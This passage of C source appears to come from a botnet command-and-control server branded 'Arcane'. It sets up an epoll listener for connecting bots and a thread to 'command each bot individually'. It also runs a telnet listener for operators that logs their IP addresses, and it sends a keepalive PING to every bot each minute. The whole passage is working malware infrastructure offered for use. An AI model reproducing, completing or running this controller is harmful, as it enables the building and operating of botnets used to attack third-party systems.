        end:    // cleanup dead socket
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\e[90mArcane\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\x1b[1;37m[\e[90mArcane\x1b[1;37m] Incoming Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("IP.log", "a");
        fprintf(logFile, "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Incoming Connection From [\e[90m%d.%d.%d.%d\x1b[1;37m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], char **sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("\x1b[1;37m[\e[90mArcane\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        printf(RED "\x1b[1;37m[\e[90mArcane\x1b[1;37m] Successfully Screened - Created By [\e[90mFlexingOnLamers\x1b[1;37m]\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
        broadcast("PING", -1, "STRING");
        sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}